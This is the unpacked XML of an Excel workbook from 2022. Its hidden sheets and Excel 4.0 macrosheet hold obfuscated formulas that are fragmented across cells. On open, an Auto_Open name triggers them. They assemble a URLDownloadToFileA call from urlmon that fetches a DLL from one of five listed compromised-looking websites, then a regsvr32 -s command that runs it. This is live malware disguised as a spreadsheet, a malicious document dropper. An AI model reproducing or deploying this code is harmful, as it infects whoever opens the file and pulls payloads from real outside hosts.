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31\Новая папка (2)\ZV\"/>
    </mc:Choice>
  </mc:AlternateContent>
  <xr:revisionPtr revIDLastSave="0" documentId="13_ncr:1_{2F957170-584C-4CD2-987C-5A5675418DA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djfs" sheetId="2" state="hidden" r:id="rId2"/>
    <sheet name="Dghdb" sheetId="3" state="hidden" r:id="rId3"/>
    <sheet name="Vghsg" sheetId="4" state="hidden" r:id="rId4"/>
    <sheet name="Urgds" sheetId="5" state="hidden" r:id="rId5"/>
    <sheet name="Sri" sheetId="8" state="hidden" r:id="rId6"/>
    <sheet name="Njkg" sheetId="6" state="hidden" r:id="rId7"/>
    <sheet name="PIMKE" sheetId="7" state="hidden" r:id="rId8"/>
  </sheets>
  <definedNames>
    <definedName name="IVFB1">PIMKE!$C$14</definedName>
    <definedName name="IVFB2">PIMKE!$C$16</definedName>
    <definedName name="IVFB3">PIMKE!$C$18</definedName>
    <definedName name="IVFB4">PIMKE!$C$20</definedName>
    <definedName name="IVFB5">PIMKE!$C$22</definedName>
    <definedName name="IVFB6">PIMKE!$C$24</definedName>
    <definedName name="IVFB7">PIMKE!$C$26</definedName>
    <definedName name="_xlnm.Auto_Open567980">PIMKE!$C$1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R18" i="4"/>
  <c r="J20" i="3"/>
  <c r="J18" i="3"/>
  <c r="H20" i="3"/>
  <c r="H18" i="3"/>
  <c r="F20" i="3"/>
  <c r="F18" i="3"/>
  <c r="B13" i="4"/>
  <c r="S2" i="4"/>
  <c r="L8" i="3"/>
  <c r="I2" i="3"/>
  <c r="E10" i="3"/>
  <c r="C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<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="19" uniqueCount="18">
  <si>
    <t>-</t>
  </si>
  <si>
    <t>G</t>
  </si>
  <si>
    <t>p</t>
  </si>
  <si>
    <t>h</t>
  </si>
  <si>
    <t>t</t>
  </si>
  <si>
    <t>!</t>
  </si>
  <si>
    <t>/</t>
  </si>
  <si>
    <t xml:space="preserve">&lt;0, </t>
  </si>
  <si>
    <t>SysWow64\</t>
  </si>
  <si>
    <t>\Windows\</t>
  </si>
  <si>
    <t>",0,0)</t>
  </si>
  <si>
    <t>,0,"</t>
  </si>
  <si>
    <t>r"&amp;"egsv"&amp;"r"&amp;"32.exe</t>
  </si>
  <si>
    <t>https://jetanahtarcilingir.net/wp-admin/dNZqOigWx5XCnSlZ/</t>
  </si>
  <si>
    <t>http://formulationdrugstore.com/wp-includes/UTDuP5ti/</t>
  </si>
  <si>
    <t>http://flexaviationcenter.com/bin/mvd4h6/</t>
  </si>
  <si>
    <t>http://flumedya.com/assets/zahEwukU/</t>
  </si>
  <si>
    <t>https://brutobrasil.com.br/pdf/LubLsUkjN/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</si>
</sst>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IntlMacrosheet" Target="macrosheets/intlsheet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95250</xdr:colOff>
      <xdr:row>1</xdr:row>
      <xdr:rowOff>10247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2AA1A6D7-DF0B-4429-8A11-1D421999C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410450" cy="286472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C362BF7-69CE-4C03-9251-D371075F71FC}">
  <dimension ref="C10"/>
  <sheetViews>
    <sheetView showFormulas="1" topLeftCell="C5" workbookViewId="0">
      <selection activeCell="C12" sqref="C12"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="3" max="3" width="255.7109375" bestFit="1" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="10" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C10" t="b">
        <f>FORMULA(Odjfs!P22&amp;Odjfs!H9&amp;Odjfs!L2&amp;Odjfs!B15&amp;Odjfs!B15&amp;Dghdb!C6&amp;Dghdb!E10&amp;Vghsg!B13&amp;Dghdb!I2&amp;Odjfs!H4&amp;Dghdb!L8&amp;Vghsg!I21&amp;Dghdb!F18&amp;Vghsg!D7&amp;Vghsg!F18,C14)=FORMULA(Odjfs!P22&amp;Odjfs!J11&amp;Odjfs!B18&amp;Odjfs!P11&amp;"IVFB1"&amp;Vghsg!Q7&amp;Odjfs!H9&amp;Odjfs!L2&amp;Odjfs!B15&amp;Odjfs!B15&amp;Dghdb!C6&amp;Dghdb!E10&amp;Vghsg!B13&amp;Dghdb!I2&amp;Odjfs!H4&amp;Dghdb!L8&amp;Vghsg!I21&amp;Dghdb!F20&amp;Vghsg!D7&amp;Vghsg!F18&amp;Odjfs!P13,C16)=FORMULA(Odjfs!P22&amp;Odjfs!J11&amp;Odjfs!B18&amp;Odjfs!P11&amp;"IVFB2"&amp;Vghsg!Q7&amp;Odjfs!H9&amp;Odjfs!L2&amp;Odjfs!B15&amp;Odjfs!B15&amp;Dghdb!C6&amp;Dghdb!E10&amp;Vghsg!B13&amp;Dghdb!I2&amp;Odjfs!H4&amp;Dghdb!L8&amp;Vghsg!I21&amp;Dghdb!H18&amp;Vghsg!D7&amp;Vghsg!F18&amp;Odjfs!P13,C18)=FORMULA(Odjfs!P22&amp;Odjfs!J11&amp;Odjfs!B18&amp;Odjfs!P11&amp;"IVFB3"&amp;Vghsg!Q7&amp;Odjfs!H9&amp;Odjfs!L2&amp;Odjfs!B15&amp;Odjfs!B15&amp;Dghdb!C6&amp;Dghdb!E10&amp;Vghsg!B13&amp;Dghdb!I2&amp;Odjfs!H4&amp;Dghdb!L8&amp;Vghsg!I21&amp;Dghdb!H20&amp;Vghsg!D7&amp;Vghsg!F18&amp;Odjfs!P13,C20)=FORMULA(Odjfs!P22&amp;Odjfs!J11&amp;Odjfs!B18&amp;Odjfs!P11&amp;"IVFB4"&amp;Vghsg!Q7&amp;Odjfs!H9&amp;Odjfs!L2&amp;Odjfs!B15&amp;Odjfs!B15&amp;Dghdb!C6&amp;Dghdb!E10&amp;Vghsg!B13&amp;Dghdb!I2&amp;Odjfs!H4&amp;Dghdb!L8&amp;Vghsg!I21&amp;Dghdb!J18&amp;Vghsg!D7&amp;Vghsg!F18&amp;Odjfs!P13,C22)=FORMULA(Odjfs!P22&amp;Odjfs!J11&amp;Odjfs!B18&amp;Odjfs!P11&amp;"IVFB5"&amp;Vghsg!Q7&amp;Odjfs!H9&amp;Odjfs!L2&amp;Odjfs!B15&amp;Odjfs!B15&amp;Dghdb!C6&amp;Dghdb!E10&amp;Vghsg!B13&amp;Dghdb!I2&amp;Odjfs!H4&amp;Dghdb!L8&amp;Vghsg!I21&amp;Dghdb!J20&amp;Vghsg!D7&amp;Vghsg!F18&amp;Odjfs!P13,C24)=FORMULA(Odjfs!P22&amp;Odjfs!J11&amp;Odjfs!B18&amp;Odjfs!P11&amp;"IVFB6"&amp;Vghsg!Q7&amp;Odjfs!H9&amp;Odjfs!B15&amp;Odjfs!I17&amp;Odjfs!I3&amp;Odjfs!H13&amp;Odjfs!P11&amp;Odjfs!K9&amp;Odjfs!P13&amp;Odjfs!P7&amp;Odjfs!P13,C26)=FORMULA(Odjfs!P22&amp;Odjfs!H13&amp;Odjfs!N4&amp;Odjfs!H13&amp;Odjfs!H9&amp;Odjfs!P11&amp;Odjfs!P15&amp;Odjfs!H9&amp;Odjfs!P20&amp;Vghsg!M14&amp;Vghsg!N10&amp;Vghsg!I6&amp;Vghsg!R18&amp;Vghsg!S2&amp;Odjfs!P15&amp;Odjfs!P13,C28)=FORMULA(Odjfs!P22&amp;Odjfs!F4&amp;Odjfs!H13&amp;Odjfs!E6&amp;Odjfs!E11&amp;Odjfs!G24&amp;Odjfs!K23&amp;Odjfs!P11&amp;Odjfs!P13,C32)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U744" sqref="AU74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BE8EC-A516-49A5-86EB-406DE528FA9B}">
  <dimension ref="A2:Q37"/>
  <sheetViews>
    <sheetView topLeftCell="A7" workbookViewId="0">
      <selection activeCell="C6" sqref="C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35B4-3B66-425C-8748-CA5CB518D8D3}">
  <dimension ref="C2:L20"/>
  <sheetViews>
    <sheetView topLeftCell="A4" workbookViewId="0">
      <selection activeCell="G16" sqref="G16"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <sheetData>
    <row r="2" spans="3:12" x14ac:dyDescent="0.25">
      <c r="I2" t="str">
        <f>T(Odjfs!F15&amp;Odjfs!E6&amp;Odjfs!E2&amp;Odjfs!B18&amp;Odjfs!G2&amp;Odjfs!C9)</f>
        <v>dToFil</v>
      </c>
    </row>
    <row r="6" spans="3:12" x14ac:dyDescent="0.25">
      <c r="C6" t="str">
        <f>T(Odjfs!P11&amp;Odjfs!P15&amp;Odjfs!B5&amp;Odjfs!C3&amp;Odjfs!C9)</f>
        <v>("url</v>
      </c>
    </row>
    <row r="8" spans="3:12" x14ac:dyDescent="0.25">
      <c r="L8" t="str">
        <f>T(Odjfs!L2&amp;Odjfs!P15&amp;Odjfs!P7&amp;Odjfs!P15&amp;Odjfs!J6&amp;Odjfs!J6&amp;Odjfs!H9&amp;Odjfs!H9&amp;Odjfs!K14&amp;Odjfs!K14&amp;Odjfs!P15)</f>
        <v>A","JJCCBB"</v>
      </c>
    </row>
    <row r="10" spans="3:12" x14ac:dyDescent="0.25">
      <c r="E10" t="str">
        <f>T(Odjfs!A12&amp;Odjfs!E2&amp;Odjfs!D7&amp;Odjfs!P15&amp;Odjfs!P7&amp;Odjfs!P15&amp;Odjfs!E11&amp;Odjfs!F4&amp;Odjfs!B15&amp;Odjfs!D13)</f>
        <v>mon","URLD</v>
      </c>
    </row>
    <row r="18" spans="6:11" x14ac:dyDescent="0.25">
      <c r="F18" t="str">
        <f>T(Urgds!C5)</f>
        <v>https://jetanahtarcilingir.net/wp-admin/dNZqOigWx5XCnSlZ/</v>
      </c>
      <c r="G18">
        <v>1</v>
      </c>
      <c r="H18" t="str">
        <f>T(Urgds!G13)</f>
        <v>http://formulationdrugstore.com/wp-includes/UTDuP5ti/</v>
      </c>
      <c r="I18">
        <v>3</v>
      </c>
      <c r="J18" t="str">
        <f>T(Njkg!E9)</f>
        <v>http://flexaviationcenter.com/bin/mvd4h6/</v>
      </c>
      <c r="K18">
        <v>5</v>
      </c>
    </row>
    <row r="20" spans="6:11" x14ac:dyDescent="0.25">
      <c r="F20" t="str">
        <f>T(Urgds!E9)</f>
        <v>https://jetanahtarcilingir.net/wp-admin/dNZqOigWx5XCnSlZ/</v>
      </c>
      <c r="G20">
        <v>2</v>
      </c>
      <c r="H20" t="str">
        <f>T(Njkg!D4)</f>
        <v>https://brutobrasil.com.br/pdf/LubLsUkjN/</v>
      </c>
      <c r="I20">
        <v>4</v>
      </c>
      <c r="J20" t="str">
        <f>T(Njkg!G13)</f>
        <v>http://flumedya.com/assets/zahEwukU/</v>
      </c>
      <c r="K20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AC4ED-58EE-4ED4-BEF2-5F15BE76FEE5}">
  <dimension ref="B2:S21"/>
  <sheetViews>
    <sheetView topLeftCell="A4" workbookViewId="0">
      <selection activeCell="I7" sqref="I7"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <sheetData>
    <row r="2" spans="2:19" x14ac:dyDescent="0.25">
      <c r="S2" t="str">
        <f>T(Odjfs!P19&amp;Odjfs!P5&amp;Odjfs!P5&amp;Odjfs!P3&amp;Odjfs!G14&amp;Odjfs!H4&amp;Odjfs!F10&amp;Odjfs!D7&amp;Odjfs!P5&amp;Odjfs!F15&amp;Odjfs!C9&amp;Odjfs!C9)</f>
        <v xml:space="preserve"> ..\xewn.dll</v>
      </c>
    </row>
    <row r="6" spans="2:19" x14ac:dyDescent="0.25">
      <c r="I6" t="s">
        <v>12</v>
      </c>
    </row>
    <row r="7" spans="2:19" x14ac:dyDescent="0.25">
      <c r="D7" t="str">
        <f>T(Odjfs!P15&amp;Odjfs!P7&amp;Odjfs!P15&amp;Odjfs!P5&amp;Odjfs!P5&amp;Odjfs!P3&amp;Odjfs!G14&amp;Odjfs!H4&amp;Odjfs!F10&amp;Odjfs!D7&amp;Odjfs!P5&amp;Odjfs!F15&amp;Odjfs!C9&amp;Odjfs!C9)</f>
        <v>","..\xewn.dll</v>
      </c>
      <c r="Q7" t="s">
        <v>7</v>
      </c>
    </row>
    <row r="10" spans="2:19" x14ac:dyDescent="0.25">
      <c r="N10" t="s">
        <v>8</v>
      </c>
    </row>
    <row r="13" spans="2:19" x14ac:dyDescent="0.25">
      <c r="B13" t="str">
        <f>CONCATENATE(Odjfs!E2,Odjfs!F10,Odjfs!D7,Odjfs!C9,Odjfs!E2,Odjfs!D17)</f>
        <v>ownloa</v>
      </c>
    </row>
    <row r="14" spans="2:19" x14ac:dyDescent="0.25">
      <c r="M14" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="18" spans="6:18" x14ac:dyDescent="0.25">
      <c r="F18" t="s">
        <v>10</v>
      </c>
      <c r="R18" t="str">
        <f>T(Odjfs!P19&amp;Odjfs!P2&amp;Odjfs!M7)</f>
        <v xml:space="preserve"> -s</v>
      </c>
    </row>
    <row r="21" spans="6:18" x14ac:dyDescent="0.25">
      <c r="I21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C346B-45E2-485A-AB89-294A46426CE9}">
  <dimension ref="C1:O13"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="B3" sqref="B3"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <sheetData>
    <row r="1" spans="3:15" x14ac:dyDescent="0.25">
      <c r="O1">
        <v>11</v>
      </c>
    </row>
    <row r="5" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C5" t="s">
        <v>13</v>
      </c>
    </row>
    <row r="9" spans="3:15" x14ac:dyDescent="0.25">
      <c r="E9" t="s">
        <v>13</v>
      </c>
    </row>
    <row r="13" spans="3:15" x14ac:dyDescent="0.25">
      <c r="G13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7BBD2-E6BD-4C7F-9AEB-EEA749F148E5}">
  <dimension ref="C8"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="D8" sqref="D8"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <sheetData>
    <row r="8" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C8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44BAF-770B-4A5A-AB74-AA5E902575AB}">
  <dimension ref="B1:G13"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="C8" sqref="C8"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <sheetData>
    <row r="1" spans="2:7" x14ac:dyDescent="0.25">
      <c r="B1">
        <v>22</v>
      </c>
    </row>
    <row r="4" spans="2:7" x14ac:dyDescent="0.25">
      <c r="D4" t="s">
        <v>17</v>
      </c>
    </row>
    <row r="9" spans="2:7" x14ac:dyDescent="0.25">
      <c r="E9" t="s">
        <v>15</v>
      </c>
    </row>
    <row r="13" spans="2:7" x14ac:dyDescent="0.25">
      <c r="G13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Макросы Excel 4.0</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="8" baseType="lpstr">
      <vt:lpstr>Sheet</vt:lpstr>
      <vt:lpstr>Odjfs</vt:lpstr>
      <vt:lpstr>Dghdb</vt:lpstr>
      <vt:lpstr>Vghsg</vt:lpstr>
      <vt:lpstr>Urgds</vt:lpstr>
      <vt:lpstr>Sri</vt:lpstr>
      <vt:lpstr>Njkg</vt:lpstr>
      <vt:lpstr>PIMKE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EGSrwhs</dc:creator>
  <cp:lastModifiedBy>RHfdh</cp:lastModifiedBy>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2022-03-31T16:47:41Z</dcterms:modified>
</cp:coreProperties>
</file>